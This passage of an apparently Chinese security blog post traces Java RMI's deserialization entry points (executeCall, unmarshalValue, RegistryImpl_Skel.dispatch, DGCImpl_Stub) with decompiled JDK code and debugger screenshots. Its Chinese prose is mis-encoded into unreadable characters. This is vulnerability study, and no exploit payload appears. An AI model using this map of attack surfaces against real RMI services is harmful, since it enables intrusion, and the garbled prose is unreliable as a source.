·çš„è¯·æ±‚åŒæ ·å¯ä»¥è¢«æ”»å‡»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png"></p><p>ç»“æŸ <font style="color:#080808;background-color:#ffffff;">call.executeCall(); åä¼šå‡ºç°å¦ä¸€ä¸ªååºåˆ—åŒ–ç‚¹</font></p><p>è¿›å…¥ <strong>unmarshalValue</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png"></p><p><strong>unmarshalValue å‡½æ•°çš„ä½œç”¨å°±æ˜¯æ ¹æ®ç›®æ ‡ç±»å‹ï¼Œé€‰æ‹©æ­£ç¡®çš„æ–¹å¼ä»è¾“å…¥æµä¸­è¯»å–æ•°æ®</strong>ã€‚</p><ul><li>å¯¹åŸºæœ¬ç±»å‹ï¼Œç”¨ä¸“é—¨çš„ <code>readxxx()</code> æ–¹æ³•è¯»å–ï¼Œå†è¿”å›</li><li>å¯¹å¯¹è±¡ç±»å‹ï¼Œç›´æ¥è°ƒç”¨ <code>readObject()</code> ååºåˆ—åŒ–</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png"></p><p>returnValue è¿”å›äº† â€œHELLOâ€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png"></p><h4 id="æ€»ç»“-å®¢æˆ·ç«¯äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ç‚¹"><a href="#æ€»ç»“-å®¢æˆ·ç«¯äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ç‚¹" class="headerlink" title="æ€»ç»“-å®¢æˆ·ç«¯äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ç‚¹"></a>æ€»ç»“-å®¢æˆ·ç«¯äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ç‚¹</h4><ol><li>StreamRemoteCall.executeCall</li></ol><p>StreamRemoteCall ç±»ä¸­çš„ executeCall æ˜¯çœŸæ­£å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ–¹æ³•</p><p><strong>executeCall ä¸­æœ‰ä¸€æ­¥é€šè¿‡ååºåˆ—åŒ–å¤„ç†å¼‚å¸¸ï¼Œå¦‚æœæ³¨å†Œä¸­å¿ƒæœ‰æ¶æ„å¯¹è±¡ï¼Œå®¢æˆ·ç«¯åœ¨æ­¤å¤„ååºåˆ—åŒ–æ—¶è¢«æ”»å‡»ã€‚</strong></p><p><strong>ç”±äº executeCall æ˜¯å®¢æˆ·ç«¯ç½‘ç»œè¯·æ±‚çš„å¿…ç»ä¹‹è·¯ï¼Œæ‰€ä»¥è¿™ä¸ªååºåˆ—åŒ–å‡ ä¹ä¸å¯é¿å…</strong></p><hr><p>executeCall å¤„ç†çš„åè®®å°±æ˜¯<strong>JRMP åè®®</strong></p><ol start="2"><li>unmarshalValue</li></ol><p>unmarshalValue å‡½æ•°å‘æœåŠ¡ç«¯è¯·æ±‚è·å–è¿”å›å€¼æ—¶ï¼Œè¿”å›å€¼æ˜¯é€šè¿‡ååºåˆ—åŒ–äº§ç”Ÿçš„ã€‚</p><h3 id="3-5-æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯è¯·æ±‚æ—¶"><a href="#3-5-æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯è¯·æ±‚æ—¶" class="headerlink" title="3.5 æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯è¯·æ±‚æ—¶"></a>3.5 æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯è¯·æ±‚æ—¶</h3><p>å‰é¢è¯´è¿‡ï¼ŒæœåŠ¡ç«¯åˆ›å»ºäº† stub å¹¶å°†ä¿¡æ¯å°è£…åˆ° targetï¼Œéšåçš„ NewThreadAction åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œç­‰å¾…å®¢æˆ·ç«¯çš„å“åº”</p><blockquote><p>è¿™ä¸ªçº¿ç¨‹å¼€å¯ä¹‹åç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png"></p></blockquote><p>ç°åœ¨è¿›å…¥åˆ›å»ºçº¿ç¨‹çš„æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png"></p><p>è¿›å…¥ run() åï¼Œåªèƒ½è°ƒç”¨ <font style="color:#080808;background-color:#ffffff;">executeAcceptLoopï¼ŒexecuteAcceptLoop åˆåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png"></p><p>run è°ƒç”¨äº† run0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png"></p><p>run0 å‰é¢éƒ½æ˜¯åœ¨è§£æä¸€äº›åè®®ï¼Œé‡ç‚¹æ˜¯ <strong>handleMessages</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png"></p><p>å…¶ä¸­çš„ é»˜è®¤æƒ…å†µæ˜¯è°ƒç”¨äº† serviceCall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png"></p><p>serviceCall ä¼šä»è¡¨ä¸­è·å– target</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png"></p><p>æ­¤å¤„æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png"></p><p>å¯ä»¥çœ‹åˆ°æ–­ç‚¹å¤„çš„ stub å°±æ˜¯æœåŠ¡ç«¯åˆ›å»ºå¥½çš„ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png"></p><p>ä¹‹åä¼šè°ƒç”¨ disp.dispatchï¼Œdisp æ˜¯ä¸€ä¸ªåˆ†å‘å™¨ï¼Œç”¨äºå°†è¿œç¨‹è¯·æ±‚åˆ†å‘åˆ°æœåŠ¡ç«¯æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png"></p><p>è¿™é‡Œ skel ä¸ä¸ºç©ºå°±ä¼šè°ƒç”¨ oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png"></p><p><font style="color:#080808;background-color:#ffffff;">skel.dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png"></p><p>è€Œ <font style="color:#080808;background-color:#ffffff;">skel.dispatch æ˜¯å±äº RegistryImpl_Skel ç±»ä¸­çš„ dispatch</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png"></p><p>æ¥ä¸‹æ¥å°±åˆ°äº†é‡ç‚¹ï¼š</p><p><strong>RegistryImpl_Skel.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                String var100;<br>                Remote var103;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var100 = (String)var105.readObject();<br>                    var103 = (Remote)var105.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var100, var103);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var99 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var102.writeObject(var99);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                String var98;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    <span class="hljs-comment">//æ­¤å¤„ä¸ºæ³¨å†Œä¸­å¿ƒï¼Œç›´æ¥è°ƒç”¨äº†ååºåˆ—åŒ–</span><br>                    var98 = (String)var104.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var9.writeObject(var101);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                Remote var8;<br>                String var97;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var97 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var97, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                String var7;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (String)var10.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.unbind(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ€»ç»“-æ³¨å†Œä¸­å¿ƒäº§ç”Ÿçš„æ¼æ´ç‚¹"><a href="#æ€»ç»“-æ³¨å†Œä¸­å¿ƒäº§ç”Ÿçš„æ¼æ´ç‚¹" class="headerlink" title="æ€»ç»“-æ³¨å†Œä¸­å¿ƒäº§ç”Ÿçš„æ¼æ´ç‚¹"></a>æ€»ç»“-æ³¨å†Œä¸­å¿ƒäº§ç”Ÿçš„æ¼æ´ç‚¹</h4><ol><li>å®¢æˆ·ç«¯åœ¨è¯·æ±‚æ—¶ ï¼ˆ<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>ï¼‰ï¼Œ<code>lookup</code>çš„å¯¹è±¡æ˜¯åºåˆ—åŒ–åä¼ åˆ°æ³¨å†Œä¸­å¿ƒçš„ï¼Œè€Œæ³¨å†Œä¸­å¿ƒçš„ **RegistryImpl_Skel **ä¸­ï¼Œå¤§éƒ¨åˆ† case çš„å‡½æ•°éƒ½æœ‰ååºåˆ—åŒ–ã€‚å¦‚æœæ˜¯ä¸€ä¸ªæ¶æ„åºåˆ—åŒ–å¯¹è±¡ï¼Œåœ¨æ³¨å†Œä¸­å¿ƒè¿è¡Œåˆ° **RegistryImpl_Skel **æ—¶ï¼Œä¼šäº§ç”Ÿååºåˆ—åŒ–æ¼æ´ <code>var98 = (String)var104.readObject();</code></li></ol><h3 id="3-6-æœåŠ¡ç«¯-å®¢æˆ·ç«¯è¯·æ±‚æ—¶"><a href="#3-6-æœåŠ¡ç«¯-å®¢æˆ·ç«¯è¯·æ±‚æ—¶" class="headerlink" title="3.6 æœåŠ¡ç«¯-å®¢æˆ·ç«¯è¯·æ±‚æ—¶"></a>3.6 æœåŠ¡ç«¯-å®¢æˆ·ç«¯è¯·æ±‚æ—¶</h3><p>è¿‡ç¨‹å’Œæ³¨å†Œä¸­å¿ƒè¢«å®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸€æ ·ï¼Œä½†è¦æ³¨æ„ï¼Œè°ƒè¯•çš„æ—¶å€™éœ€è¦ä»£ç†æ˜¯åŠ¨æ€ä»£ç†ï¼ŒæŒ‰ F9 è®©ç¨‹åºå¾€ä¸‹è¿è¡Œç›´åˆ°å¾—åˆ°åŠ¨æ€ä»£ç†ã€‚</p><p>å›¾ä¸­çš„ RegistryImpl_Stub   DGCImpl_Stub éƒ½ä¸æ˜¯æƒ³è¦çš„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png"></p><p>æœ€ç»ˆæ‹¿åˆ°çš„ $Proxy0 æ˜¯æˆ‘ä»¬éœ€è¦çš„åŠ¨æ€ä»£ç†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png"></p><p>åŒæ ·æ¥åˆ° disp.dispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png"></p><p>ä¸ä¸€æ ·çš„æ˜¯åœ¨ <code>skel != null</code>åˆ¤æ–­æ—¶ï¼Œæ­¤æ—¶çš„ skel ä¸ºç©ºï¼Œä¸è¿›å…¥ oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png"></p><p>ç»§ç»­èµ°ï¼Œè·å–è¿œç¨‹æ–¹æ³• sayHello</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png"></p><p>ä¹‹åä¼šè¿›å…¥ <font style="color:#080808;background-color:#ffffff;">unmarshalValueï¼Œåœ¨ å®¢æˆ·ç«¯äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ç‚¹ ä¸­ä¹Ÿæœ‰ unmarshalValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png"></p><p>æœ€ç»ˆåœ¨ <code>result = method.invoke(obj, params);</code><font style="color:#080808;background-color:#ffffff;"> è¿™ä¸€æ­¥å®Œæˆè¿œç¨‹è°ƒç”¨</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png"></p><h3 id="3-7-DGC-å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯"><a href="#3-7-DGC-å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯" class="headerlink" title="3.7 DGC-å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯"></a>3.7 DGC-å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯</h3><blockquote><p><font style="color:rgb(51, 51, 51);">åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œåˆç§°DGCï¼ŒRMIä½¿ç”¨DGCæ¥åšåƒåœ¾å›æ”¶ï¼Œå› ä¸ºè·¨è™šæ‹Ÿæœºçš„æƒ…å†µä¸‹è¦åšåƒåœ¾å›æ”¶æ²¡åŠæ³•ä½¿ç”¨åŸæœ‰çš„æœºåˆ¶ã€‚æˆ‘ä»¬ä½¿ç”¨çš„è¿œç¨‹å¯¹è±¡åªæœ‰åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½ä¸å—å¼•ç”¨æ—¶æ‰ä¼šç»“æŸç”Ÿå‘½å‘¨æœŸã€‚</font></p><p><font style="color:rgb(51, 51, 51);">è€Œæ—¢ç„¶RMIä¾èµ–äºDGCåšåƒåœ¾å›æ”¶ï¼Œé‚£ä¹ˆåœ¨RMIæœåŠ¡ä¸­å¿…ç„¶ä¼šæœ‰DGCå±‚ï¼Œåœ¨ysoä¸­æ”»å‡»DGCå±‚å¯¹åº”çš„æ˜¯JRMPClientï¼Œåœ¨æ”»å‡»RMI Registryå°èŠ‚ä¸­æåˆ°äº†skelå’Œstubå¯¹åº”çš„Registryçš„æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼ŒåŒæ ·çš„ï¼ŒDGCå±‚ä¸­ä¹Ÿä¼šæœ‰skelå’Œstubå¯¹åº”çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯DGCImpl_Skelå’ŒDGCImpl_Stubï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æ­¤å¤„åˆ†æï¼Œé¿å…å†—é•¿çš„debugã€‚</font></p><p><font style="color:rgb(51, 51, 51);">è€Œå®¢æˆ·ç«¯ä¸€æ–¹åœ¨ä½¿ç”¨æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨æ—¶éœ€è¦è°ƒç”¨dirtyæ¥æ³¨å†Œï¼Œåœ¨ç”¨å®Œæ—¶éœ€è¦è°ƒç”¨cleanè¿›è¡Œæ¸…é™¤ã€‚</font></p></blockquote><p><strong><font style="color:#080808;background-color:#ffffff;">DGCImpl_Stub</font></strong></p><p><font style="color:rgb(80, 80, 92);">clean å°±æ˜¯â€å¼ºâ€æ¸…é™¤å†…å­˜ï¼Œdirty å°±æ˜¯â€å¼±â€æ¸…é™¤å†…å­˜</font></p><p><font style="color:rgb(80, 80, 92);">è¿™é‡Œè°ƒç”¨äº† </font><code>readObject()</code><font style="color:rgb(80, 80, 92);"> æ–¹æ³•ï¼Œå­˜åœ¨ååºåˆ—åŒ–çš„å…¥å£ç±»ã€‚</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clean</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, VMID var4, <span class="hljs-type">boolean</span> var5)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getOutputStream();<br>            var7.writeObject(var1);<br>            var7.writeLong(var2);<br>            var7.writeObject(var4);<br>            var7.writeBoolean(var5);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var6);<br>        <span class="hljs-built_in">super</span>.ref.done(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var9) &#123;<br>        <span class="hljs-keyword">throw</span> var9;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var10) &#123;<br>        <span class="hljs-keyword">throw</span> var10;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var11);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> Lease <span class="hljs-title function_">dirty</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, Lease var4)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">1</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var6</span> 